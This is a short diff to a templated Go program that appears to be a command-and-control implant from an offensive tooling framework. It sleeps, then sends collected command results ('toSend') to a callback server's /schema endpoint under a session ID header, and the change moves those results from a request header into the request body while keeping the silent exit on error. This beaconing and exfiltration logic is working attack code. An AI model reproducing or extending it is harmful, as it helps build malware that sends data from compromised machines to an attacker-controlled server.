@@ -119,7 +119,7 @@ func main() {
 		os.Exit(0)
 	}
 
-	uuid := "{{.UUID}}"
+	uuid := strings.ToUpper("{{.UUID}}")
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	//client := &http.Client{}
 	expectedFingerprint = {{.Fingerprint}}
@@ -233,8 +233,8 @@ func main() {
 		toSend = strings.Replace(toSend, "\n", "", -1)
 
 		time.Sleep(time.Duration(sleepTime) * time.Second)
-		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", nil)
-		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
+		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", strings.NewReader(string(toSend)))
+		req.Header = http.Header{"APPSESSIONID": {uuid}}
 		resp, err = client.Do(req)
 		if err != nil {
 			os.Exit(0)
